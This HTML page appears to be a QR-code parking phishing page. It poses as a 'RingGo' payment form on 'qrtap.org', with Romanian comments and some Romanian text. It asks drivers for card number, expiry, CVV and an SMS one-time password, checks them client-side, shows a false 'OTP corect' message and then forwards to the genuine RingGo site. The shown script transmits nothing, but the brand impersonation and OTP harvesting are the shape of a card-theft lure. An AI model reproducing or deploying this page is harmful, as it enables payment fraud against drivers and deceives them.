<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>QR Tap – Quick Parking</title>
  <meta name="description" content="Enter your details and continue securely to RingGo. Data is not stored.">

  <style>
    :root{
      --bg:#0b1020; --card:#121726; --muted:#9aa4b2; --text:#eef2f7;
      --line:#1f2637; --accent:#21c48d; --accent2:#15a374; --danger:#ef4444; --ok:#22c55e;
    }
    *{box-sizing:border-box}
    body{margin:0; font-family:system-ui,Segoe UI,Roboto,Arial; background:var(--bg); color:var(--text)}
    .wrap{max-width:860px; margin:24px auto; padding:20px}
    .card{background:var(--card); border:1px solid var(--line); border-radius:20px; padding:26px; box-shadow:0 10px 28px rgba(0,0,0,.35)}
    h1{margin:0 0 6px; font-size:26px}
    p{margin:0 0 14px; color:var(--muted)}
    label{display:block; margin:14px 0 6px; font-weight:600}
    input, select{width:100%; background:#0f1424; border:1px solid var(--line); color:var(--text); padding:14px; border-radius:12px; outline:none}
    .row{display:grid; gap:12px; grid-template-columns:1fr 1fr}
    .row-3{display:grid; gap:12px; grid-template-columns:1fr 1fr 1fr}
    .btn{display:inline-block; width:100%; text-align:center; border-radius:14px; padding:16px 18px; font-weight:800; cursor:pointer; border:none}
    .btn.primary{background:var(--accent); color:#062a1d}
    .btn.primary:hover{background:var(--accent2)}
    .badge{font-size:12px; color:#7f93d0; background:#064eab; border-radius:999px; padding:4px 10px; display:inline-block}
    .note{font-size:12px; color:#88a0b8; margin-top:6px}
    .muted{color:var(--muted); font-size:12px}

    /* Toast */
    .toasts{position:fixed; right:16px; bottom:16px; display:flex; flex-direction:column; gap:10px; z-index:9999}
    .toast{min-width:260px; background:#0f1424; color:var(--text); border:1px solid var(--line); border-radius:12px; padding:12px 14px; box-shadow:0 8px 24px rgba(0,0,0,.35); opacity:0; transform:translateY(10px); animation:toast-in .18s ease-out forwards}
    .toast.ok{border-color:rgba(34,197,94,.45)}
    .toast.err{border-color:rgba(239,68,68,.45)}
    @keyframes toast-in{to{opacity:1; transform:translateY(0)}}

    @media (max-width:700px){
      .row, .row-3{grid-template-columns:1fr}
    }
  </style>
</head>
<body>
  <div class="wrap">
    <div class="card">
      <div class="top">
        <h1>RingGo</h1>
        <span class="badge">qrtap.org</span>
      </div>

      <p>Completează detaliile, apoi apasă <b>Plătește & continuă la RingGo</b>. <span class="muted">Nu stocăm datele tale.</span></p>

      <form id="f" onsubmit="return false">
        <label for="plate">Car plate number</label>
        <input id="plate" name="plate" placeholder="e.g. AB12 CDE" required>

        <label for="loc">Parking location (code or name)</label>
        <input id="loc" name="loc" placeholder="e.g. RingGo code or address" required>

        <div class="row">
          <div>
            <label for="dur">Duration</label>
            <input id="dur" name="dur" placeholder="e.g. 2h" required>
          </div>
          <div>
            <label for="card">Card number</label>
            <input id="card" name="card" inputmode="numeric" autocomplete="cc-number" placeholder="e.g. 4111 1111 1111 1111" required>
          </div>
        </div>

        <div class="row-3">
          <div>
            <label for="exp">Expiry (MM/YY)</label>
            <input id="exp" name="exp" inputmode="numeric" autocomplete="cc-exp" placeholder="MM/YY" required>
          </div>
          <div>
            <label for="cvv">CVV/CVC</label>
            <input id="cvv" name="cvv" inputmode="numeric" autocomplete="cc-csc" placeholder="3 or 4 digits" required>
          </div>
          <div>
            <label for="otp">OTP (one-time password)</label>
            <input id="otp" name="otp" inputmode="numeric" maxlength="6" placeholder="e.g. 123456" required>
            <div class="note">Introdu codul primit prin SMS sau din aplicație.</div>
          </div>
        </div>

        <br>
        <button id="pay" class="btn primary" type="submit">Plătește & continuă la RingGo</button>
      </form>

      <!-- (Opțional) Butoane de test pentru toast-uri -->
      <!--
      <div style="margin-top:18px; display:grid; gap:10px; grid-template-columns:repeat(3,1fr)">
        <button class="btn" onclick="showToast('OTP incorect','err')">OTP incorect</button>
        <button class="btn" onclick="showToast('Card incorect','err')">Card incorect</button>
        <button class="btn" onclick="showToast('OTP corect','ok')">OTP corect</button>
      </div>
      -->
    </div>
  </div>

  <div class="toasts" id="toasts"></div>

  <script>
    // --- Utils ---
    function onlyDigits(s){ return (s||'').replace(/\D+/g,''); }

    function luhnValid(num){
      num = onlyDigits(num);
      if(num.length < 12) return false;
      let sum = 0, dbl = false;
      for(let i=num.length-1; i>=0; i--){
        let d = +num[i];
        if(dbl){ d*=2; if(d>9) d-=9; }
        sum += d; dbl = !dbl;
      }
      return sum % 10 === 0;
    }

    function validExpiry(mmYY){
      if(!mmYY) return false;
      const m = mmYY.match(/^\s*(\d{1,2})\s*\/\s*(\d{2})\s*$/);
      if(!m) return false;
      let mm = parseInt(m[1],10), yy = parseInt(m[2],10);
      if(mm < 1 || mm > 12) return false;

      // transformă YY în 20YY (interval aproximativ)
      const now = new Date();
      const curYY = now.getFullYear()%100;
      const curMM = now.getMonth()+1;

      // considerăm valabil dacă > (an curent) sau == și luna >= curentă
      if(yy < curYY) return false;
      if(yy === curYY && mm < curMM) return false;
      return true;
    }

    function validCVV(cvv){
      const d = onlyDigits(cvv);
      return d.length === 3 || d.length === 4;
    }

    function showToast(msg, type='ok'){
      const wrap = document.getElementById('toasts');
      const el = document.createElement('div');
      el.className = 'toast ' + (type==='err' ? 'err' : 'ok');
      el.textContent = msg;
      wrap.appendChild(el);
      setTimeout(()=>{ el.style.opacity='0'; el.style.transform='translateY(10px)'; }, 2600);
      setTimeout(()=>{ el.remove(); }, 3000);
    }

    // Pre-populează location din QR: ?loc=12345
    (function(){
      const p = new URLSearchParams(location.search);
      const loc = p.get('loc');
      if(loc) document.getElementById('loc').value = loc;
      const savedPlate = localStorage.getItem('plate');
      if(savedPlate) document.getElementById('plate').value = savedPlate;
    })();

    document.getElementById('pay').addEventListener('click', function(){
      const card = document.getElementById('card').value;
      const exp  = document.getElementById('exp').value;
      const cvv  = document.getElementById('cvv').value;
      const otp  = onlyDigits(document.getElementById('otp').value);

      if(!luhnValid(card)){ showToast('Card incorect','err'); return; }
      if(!validExpiry(exp)){ showToast('Expirare invalidă','err'); return; }
      if(!validCVV(cvv)){ showToast('CVV invalid','err'); return; }
      if(otp.length !== 6){ showToast('OTP incorect','err'); return; }

      showToast('OTP corect','ok');

      // păstrează doar placa local (UX)
      const plate = document.getElementById('plate').value.trim();
      if(plate) localStorage.setItem('plate', plate);

      // mic delay pentru a vedea toast-ul, apoi RingGo
      setTimeout(()=>{ window.location.href = "https://www.myringgo.co.uk/"; }, 800);
    });
  </script>
</body>
</html>
